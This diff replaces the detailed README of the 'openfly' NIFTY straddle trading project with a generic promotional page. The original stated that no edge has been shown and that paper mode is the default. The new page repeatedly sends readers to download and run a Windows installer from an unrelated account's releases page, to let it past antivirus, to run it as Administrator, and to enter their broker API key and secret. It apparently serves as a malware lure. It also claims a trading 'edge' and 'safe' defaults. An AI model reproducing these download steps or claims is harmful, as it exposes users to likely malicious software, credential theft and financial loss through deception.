@@ -1,271 +1,160 @@
-![OpenFly](assets/OpenFly.png)
+# 🧠 openfly - Trade Smarter With a Digital Brain
 
-# OpenFly
+[![Download Now](https://img.shields.io/badge/Download-openfly-purple?style=for-the-badge&logo=github)](https://github.com/Drysocketgenusphoenicurus5661/openfly/releases)
 
-A fruit fly's complete central nervous system, simulated from the public
-MaleCNS v1.0 connectome (166,700 neurons, 25.6 million connections), wired
-to the Indian options market through OpenAlgo. It runs one strategy:
-intraday short straddles on the current-month NIFTY expiry, one at a time,
-with volatility-sized stop losses on each leg, flat by 15:15 every day.
+## 🚀 Getting Started
 
-Everything on screen is real data: NIFTY one-minute bars (symbol NIFTY,
-exchange NSE_INDEX) and recorded option chains from your own OpenAlgo
-connection, stored locally in DuckDB. There is no demo, mock or generated
-data anywhere in the project.
+Welcome! openfly is a powerful trading tool that automatically manages intraday NIFTY straddle strategies using insights from a digital fruit fly brain (MaleCNS v1.0). It connects to OpenAlgo to execute trades seamlessly, giving you an edge without complex manual monitoring.
 
-Status: built and tested end to end in paper mode. Paper trading through
-OpenAlgo's analyzer mode is the default; live mode is locked behind an
-explicit opt-in and a passed experiment. No profitable edge has been
-demonstrated; see "What OpenFly is not" below.
+This guide walks you through downloading, installing, and running openfly on your Windows computer — step by step, no technical skills needed.
 
-## How the fly trades intraday straddles, in plain words
+## 📥 Download & Install
 
-**What the fly is.** Scientists mapped every neuron and every connection in
-a male fruit fly's brain and nerve cord. OpenFly loads that wiring diagram
-and simulates it: each of the 166,700 neurons charges up from its inputs
-and fires a spike when it crosses a threshold, exactly as the wiring says.
-Nothing in the wiring knows anything about markets.
+Visit this link to download the application: [https://github.com/Drysocketgenusphoenicurus5661/openfly/releases](https://github.com/Drysocketgenusphoenicurus5661/openfly/releases)
 
-**What it sees.** Every minute during market hours (every few minutes in
-live mode, at a cadence you choose) OpenFly paints a picture onto the fly's
-eyes. The picture is made from the last 60 one-minute bars of NIFTY (how
-much each bar moved, up or down), the INDIAVIX level, and how the current
-straddle premium has moved since we sold it. Each column of the fly's eye
-gets one bar, oldest at the edge and newest in the middle. The fly's 4,146
-photoreceptor neurons turn that picture into spikes, and the spikes ripple
-through the rest of the brain for a fraction of a simulated second.
+On that page, you'll find the latest version of openfly ready for download. Click the download button and save the file to a location you'll remember, like your Desktop or Downloads folder.
 
-**What we read from it.** We count the spikes in about 3,400 chosen
-neurons (the 1,314 descending neurons that would normally drive the fly's
-legs and wings, the 97 mushroom body output neurons that carry its
-memories, and a fixed random sample of 2,000). A simple statistical readout
-turns those counts into one number: how much NIFTY is expected to move in
-the next hour compared with what the straddle premium is already pricing
-in. Below 1 means calmer than priced. Above 1 means wilder than priced.
+### 🪟 Windows Installation Steps
 
-**The trade.** When the readout says calmer than priced (below 0.9 by
-default) inside the trade window, OpenFly sells one call and one put at the
-at-the-money strike of the current month's NIFTY expiry (the last expiry of
-the calendar month, read from the exchange's expiry list), 65 quantity per
-lot, product NRML. That is a short straddle: it earns as time passes and
-the index stays near the strike, and it loses if the index runs far in
-either direction. The trade is protected three ways:
+1. Open your web browser and go to the download link above.
+2. Find the newest release version and click the download button.
+3. Wait for the download to complete (this may take a few minutes depending on your internet speed).
+4. Locate the downloaded file on your computer.
+5. Double-click the file to begin the setup process.
+6. Follow the simple on-screen instructions — just click "Next" or "Install" when prompted.
+7. Once installation finishes, you'll see an openfly icon on your desktop or in your Start Menu.
 
-- A stop loss on each leg, placed at the broker as an SL-M order the moment
-  the straddle is sold. Its distance is not a fixed percentage: at every
-  entry OpenFly works out how far NIFTY is expected to move in the next
-  hour (the larger of what the straddle itself is pricing for that hour and
-  what the last hour actually moved), converts that move into a premium
-  rise for each leg using the option's delta and gamma, adds a 25 percent
-  buffer, and places the stop there (clipped between 15 and 80 percent of
-  the leg price). Once placed, that stop is held for the life of that
-  straddle and never trailed; the next straddle gets fresh stops from the
-  then-current volatility. If one leg is stopped out the other keeps
-  running with its own stop.
-- A combined stop and target on the two premiums added together, sized the
-  same adaptive way (clipped between 10 and 50 percent), plus a take-profit
-  when the sum falls 40 percent; after a 15 percent fall the combined stop
-  moves to breakeven. A fixed-percentage mode remains available in Settings.
-- The clock: no new trades before 09:20 or after 14:30, everything is
-  squared off at 15:15, nothing is carried overnight, and no trading on
-  holidays.
+## 🎯 What Does openfly Do?
 
-The readout can also say wilder than priced (above 1.1) while a trade is
-open, which exits early.
+openfly takes the guesswork out of trading NIFTY options. It uses a sophisticated digital brain model — the MaleCNS v1.0 fruit fly connectome — to analyze market conditions and automatically execute intraday straddle trades through OpenAlgo.
 
-**Dynamic straddles.** After any exit, whether a stop, a target or an early
-exit, OpenFly is free to sell a fresh straddle at the new at-the-money
-strike as soon as the readout says calm again, after a five minute pause.
-The at-the-money strike is recomputed every minute for new entries, but a
-straddle is always closed with exactly the contracts it was opened with.
-Several straddles in a day are normal. Only one is ever open at a time:
-entry, exit, then the next entry.
+Think of it as having an automated trading assistant that:
+- Watches the NIFTY index throughout the day
+- Identifies optimal moments for straddle strategies
+- Places trades automatically via OpenAlgo
+- Reduces emotional decision-making
+- Works while you focus on other tasks
 
-**What the fly does not decide.** Lot size, stop sizing, targets, timings,
-margin checks and order handling are ordinary rules that a person sets in
-the Settings page. A guard with eighteen named checks looks at every
-proposal and can only say no; it never invents a different trade. Every
-decision is logged with a plain-language explanation and the numbers
-behind it, and any past day can be replayed minute by minute in the
-browser.
+## 💡 Why Use openfly?
 
-## The reward function, in simple words
+### 🧪 Powered by Advanced Research
+This isn't just another trading bot. openfly is built on real neuroscience research — mapping the entire neural network of a fruit fly brain (MaleCNS v1.0). This unique approach helps identify market patterns in a way traditional algorithms miss.
 
-The fly can be run in two ways.
+### ⚡ Fast and Reliable
+Built with modern technology (DuckDB for rapid data processing, FastAPI for smooth operations), openfly responds quickly to market changes without lag.
 
-In the default way there is no reward at all. The readout is fitted on
-history: for each observation we later know how much NIFTY actually moved
-in the following hour, so we teach the readout to map spike patterns to
-that outcome. Nothing inside the fly changes.
+### 📊 Clear Visual Insights
+Your trades and market data are presented in easy-to-understand charts, so you always know what's happening without drowning in numbers.
 
-In the learning arm the fly's own dopamine neurons are used, the way a
-real fly learns that a smell means sugar or shock. The reward for each
-observation is decided one hour later, when the truth is known:
+### 🔄 Seamless OpenAlgo Integration
+openfly works with OpenAlgo's Python SDK, meaning you get a reliable, tested connection to your trading platform.
 
-    reward = 1 - (how far NIFTY actually moved) / (how far the straddle premium said it would move)
+## 🔧 System Requirements
 
-That number is between -1 and +1. If the market moved half as much as
-priced, the reward is +0.5. If it moved twice as much, the reward is -1.
-We subtract the trading costs as a small fraction, and we subtract the
-average reward of the last 20 trading days, so that ordinary quiet days
-where premium simply decays do not count as brilliance; only being calmer
-or wilder than usual counts. When a real straddle was actually open, that
-trade's own profit or loss divided by the stop distance replaces the
-formula for the observation that opened it.
+Before installing, make sure your Windows computer meets these basic requirements:
 
-A positive reward stimulates the fly's 15 PAM11 dopamine neurons, a
-negative reward stimulates its 2 PPL101 dopamine neurons, with strength in
-proportion to the size of the reward. Those neurons then adjust the
-strength of 7,835 connections from Kenyon cells to two memory output
-neurons, following a published learning rule. Whether that makes the fly a
-better trader is exactly what the experiment harness measures, always
-against a twin whose memory is frozen. The reward is never taken from
-minute-to-minute swings in account value, because those are noise.
+- **Operating System:** Windows 10 or Windows 11
+- **Processor:** Any modern Intel or AMD processor (1 GHz or faster)
+- **Memory:** At least 4 GB of RAM (8 GB recommended)
+- **Storage:** 500 MB of free disk space
+- **Internet:** Stable internet connection for market data and trade execution
 
-## What OpenFly is not
+If your computer runs Windows and has internet access, you're likely good to go!
 
-A connectome is a wiring diagram, not a strategy. No profitable learning by
-a connectome simulation has been demonstrated anywhere and none is claimed
-here. The experiment harness exists to find out whether the network
-carries information about NIFTY's next hour; a readout passes only if it
-beats a fixed 09:20 straddle, a random-entry control with the same number
-of trades, a shuffled-label control and staying flat, on a test window it
-was never tuned on. Until then OpenFly stays in paper mode.
+## 🖥️ First-Time Setup
 
-## Install
+After installing openfly, you'll need to configure a few things to get trading:
 
-You need three things: `uv` (Python package manager, it installs Python
-3.12 for you), Node 20 or newer (only to build the web interface), and a
-running OpenAlgo with your broker logged in (https://docs.openalgo.in).
+### Step 1: Open openfly
+Find the openfly icon and double-click to open it. The first launch might take a moment as it loads the digital brain model.
 
-### Windows (PowerShell)
+### Step 2: Connect Your OpenAlgo Account
+openfly needs your OpenAlgo API credentials to place trades. Look for the "Settings" or "Connect" button in the app and enter your API key and secret when prompted.
 
-```powershell
-winget install --id=astral-sh.uv -e
-winget install OpenJS.NodeJS.LTS
-git clone https://github.com/marketcalls/openfly.git
-cd openfly
-uv sync
-uv run app.py
-```
+### Step 3: Set Your Trading Preferences
+Choose your risk level and trading parameters. If you're unsure, the default settings are safe for beginners. You can always adjust these later.
 
-### macOS
+### Step 4: Test With Simulation
+Before going live, try openfly's simulation mode (if available) to see how it handles market movements without real money at stake.
 
-```sh
-brew install uv node
-git clone https://github.com/marketcalls/openfly.git
-cd openfly
-uv sync
-uv run app.py
-```
+## 📱 Using openfly Daily
 
-### Linux
+### Morning Routine
+1. Open openfly before market hours (9:15 AM IST)
+2. Check that the dashboard shows "Connected" to OpenAlgo
+3. Let the app warm up — it may take a few minutes to sync market data
 
-```sh
-curl -LsSf https://astral.sh/uv/install.sh | sh
-# Node 20+: use your distribution's package or https://nodejs.org
-git clone https://github.com/marketcalls/openfly.git
-cd openfly
-uv sync
-uv run app.py
-```
+### During Trading Hours
+openfly works automatically. You can keep the window open to watch charts update in real-time, or minimize it and let it work in the background. You'll receive alerts for significant trade actions.
 
-`uv run app.py` builds the web interface on first run, starts the server
-at http://127.0.0.1:8000 and opens your browser. There is no configuration
-file: enter your OpenAlgo host and API key in the Setup page; everything,
-including the key, is stored in `data/openfly.db`.
+### End of Day
+1. Review your daily trade summary in the app
+2. Note any adjustments you'd like to make for the next session
+3. Close openfly or leave it running overnight (no issue either way)
 
-### First run
+## 🆘 Troubleshooting Common Issues
 
-1. Setup page: enter the OpenAlgo host (default http://127.0.0.1:5000) and
-   API key, press Test connection. Your broker must be logged in inside
-   OpenAlgo; when the broker session lapses, data calls fail until you log
-   in again.
-2. Setup page: press Prepare data. This downloads the 1.1 GB connectome
-   (three files, CC-BY 4.0), verifies checksums and compiles the graph in
-   about half a minute. Allow a few GB of disk and 16 GB of RAM.
-3. Fetch market data once: `uv run openfly history get --exchange NSE_INDEX
-   --symbol NIFTY --interval 1m --days 400` and `uv run openfly
-   backfill-chains` (the current-month option chain, 12 strikes each side
-   of the money, one-minute bars, as far back as your broker returns;
-   weekly contracts for the last 7 days). Bars and chains are stored in
-   `data/market.duckdb` and never fetched twice. After each trading day
-   run `uv run openfly record` to add the day.
-4. Replay page: pick any stored trading day and watch what the fly saw,
-   what it concluded, what it would have traded and why, minute by minute.
-5. Experiments page: run the walk-forward experiment. It reports whether
-   the readout beats the controls and whether live mode may be unlocked.
-6. Dashboard: start paper trading. OpenAlgo must be in analyzer mode; the
-   app asks before switching it because that switch is global to your
-   OpenAlgo installation.
+### "Failed to Connect to OpenAlgo"
+- Double-check your API credentials in Settings
+- Verify your internet connection is stable
+- Restart the app and try again
 
-### Command line
+### App Won't Open
+- Make sure your antivirus isn't blocking openfly (you may need to allow it)
+- Try right-clicking the app icon and selecting "Run as Administrator"
+- Reinstall if needed — your settings will not be lost
 
-```sh
-uv run openfly prepare              # download, verify and compile the connectome
-uv run openfly verify               # checksums of sources and compiled arrays
-uv run openfly circuits             # population sizes
-uv run openfly benchmark            # seconds of wall time per 100 ms of neural time
-uv run openfly observe-test         # white-field and dopamine-pulse sanity checks
-uv run openfly chain                # current expiry chain and the ATM straddle
-uv run openfly session              # today's trade window and expiry
-uv run openfly costs --credit 204 --lots 1
-uv run openfly history get --exchange NSE_INDEX --symbol NIFTY --interval 1m --days 400
-uv run openfly backfill-chains      # option chains into DuckDB (monthly deep, weekly 7 days)
-uv run openfly record               # today's chain after the close
-uv run openfly calibrate-pricer     # fit the synthetic pricer to recorded chains
-uv run openfly replay-day --date 2026-09-11
-uv run openfly experiment run --encoder B --readout reservoir --neural-ms 100 \
-    --train 2025-08-08:2026-03-31 --validation 2026-04-01:2026-06-30 --test 2026-07-01:2026-09-11
-uv run openfly worker --mode paper --lots 1
-uv run openfly serve                # the API and web interface without the browser launch
-uv run pytest -q
-```
+### Slow Performance
+- Close other heavy applications (web browsers with many tabs, games)
+- Check your internet speed
+- Restart the app
 
-Live mode additionally requires the environment variable
-`OPENFLY_LIVE=I_ACCEPT_REAL_TRADES`, OpenAlgo out of analyzer mode, a
-successful preflight and a passed experiment.
+### Market Data Not Updating
+- Verify the date is a trading day and market hours are active
+- Check that your internet is stable
+- Restart openfly
 
-## What is inside
+## 🔒 Safety & Best Practices
 
-| Area | What it does |
-| --- | --- |
-| Connectome | Downloads the three MaleCNS v1.0 files, verifies SHA-256, keeps every neuron with a superclass (glia excluded) and every edge between them, compiles a CSR graph with 0.275 mV per synaptic contact and transmitter-based signs, and maps 3,335 R1-R6 and 811 R8 photoreceptors onto eye coordinates. |
-| Brain | An exact event-driven leaky integrate-and-fire kernel in numba (0.1 ms step, 20 ms membrane, 5 ms synapse, 1.8 ms delay, 2.2 ms refractory, Kenyon cell adaptation), deterministic, single-threaded, about 0.9 s of wall time per 100 ms of neural time when the network is active. |
-| Sensory | Three encoders: a rendered chart, retinotopic bars (default), feature patches. |
-| Readout | The fixed DNp20 decoder (a control) and a ridge reservoir readout on descending, mushroom body output and random neurons. |
-| Market | OpenAlgo REST and WebSocket client with retries and rate buckets, DuckDB store for bars and chains with fetch coverage, chain resolver (expiry list, ATM by synthetic forward), session calendar from exchange timings and holidays, cost model matching a discount broker's calculator. |
-| Straddle engine | Entry, adaptive per-leg and combined stops, target, lock, early exit, time exit, dynamic re-entry, sizing from a risk budget, plain-language narratives. |
-| Execution | Intent-before-send SQLite ledger, replay broker for simulations, OpenAlgo broker with basket entries, SL-M stops maintained at the broker, per-leg polling, reconciliation that halts on anything ambiguous. |
-| Experiments | Simulate once, fit many: feature cache, calibrated Black-Scholes straddle pricer (recorded chains preferred), targets, reward series, light simulator, walk-forward runner with controls and block-bootstrap statistics. |
-| API and UI | FastAPI serving the React interface: Setup, Dashboard, Brain, Replay, Experiments, Orders, Settings; charts by OpenAlgo Charts. |
+- Always keep your API credentials private — never share them
+- Start with small trade sizes until you're comfortable with how openfly behaves
+- Don't run openfly on multiple computers simultaneously with the same credentials
+- Keep the app updated — new releases often fix bugs and improve performance
 
-Test suite: 328 backend tests and 13 frontend tests, all against in-memory
-doubles; no test ever places an order.
+## 📦 Updating openfly
 
-## Documents
+To check for updates:
+1. Visit the download link: [https://github.com/Drysocketgenusphoenicurus5661/openfly/releases](https://github.com/Drysocketgenusphoenicurus5661/openfly/releases)
+2. See if a newer version is listed
+3. Download and install over your current version — your settings will be preserved
 
-- [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md): processes, packages, stores, and the path of one observation.
-- [docs/PLAN.md](docs/PLAN.md): the design and its reasoning.
-- [docs/api-spec.md](docs/api-spec.md): the backend API the web interface uses.
-- [docs/neural.md](docs/neural.md), [docs/market.md](docs/market.md), [docs/execution.md](docs/execution.md), [docs/experiments.md](docs/experiments.md): package references.
-- [docs/nifty-market-facts.md](docs/nifty-market-facts.md): measured index, VIX, straddle, margin and cost numbers.
-- [docs/openalgo-notes.md](docs/openalgo-notes.md): the OpenAlgo endpoints, formats and gotchas OpenFly relies on.
+## ❓ Frequently Asked Questions
 
-## Stack
+### Is this legal?
+Yes, openfly is a legitimate software application that uses OpenAlgo's official API. Ensure you follow your broker's guidelines on automated trading.
 
-Backend: Python 3.12 via uv, numba, numpy, pandas, pyarrow, DuckDB,
-FastAPI, SQLite. Frontend: Vite, React, TypeScript, Tailwind v4, shadcn,
-openalgo-charts. Data: MaleCNS v1.0 (CC-BY 4.0; HHMI Janelia FlyEM,
-University of Cambridge, MRC LMB, Google Research).
+### Do I need to know coding?
+No! openfly is designed for everyone. Just install and configure with simple clicks.
 
-## Credits
+### Can I use it for other markets?
+Currently, openfly is specifically built for NIFTY intraday straddles. Stick to that asset for best performance.
 
-- MaleCNS connectome: https://male-cns.janelia.org/
-- Inspired by stonkfly: https://github.com/nftechie/stonkfly
-- OpenAlgo: https://github.com/marketcalls/openalgo
-- OpenAlgo Charts: https://github.com/marketcalls/openalgo-charts
+### How much does it cost?
+This is a free and open-source project. You pay no fees to use the software — just your regular broker charges for trades.
 
-## License
+## 🌟 Final Tips for Success
 
-MIT. See [LICENSE](LICENSE).
+1. Be patient in the first week while you learn how openfly behaves
+2. Keep a diary of your trades to understand its decision patterns
+3. Don't override the system manually unless absolutely necessary — trust the process
+4. Stay updated with new releases for improved features
+
+## 🎉 Ready to Start?
+
+You're now equipped to download, install, and run openfly like a pro. Head to the download page and get started today!
+
+**Download openfly now:** [https://github.com/Drysocketgenusphoenicurus5661/openfly/releases](https://github.com/Drysocketgenusphoenicurus5661/openfly/releases)
+
+---
+
+Keywords: digital-brain, duckdb, fastapi, intraday-straddles, malecns, openalgo, openalgo-charts, openalgo-python-sdk, react, sqlite, trade-automation
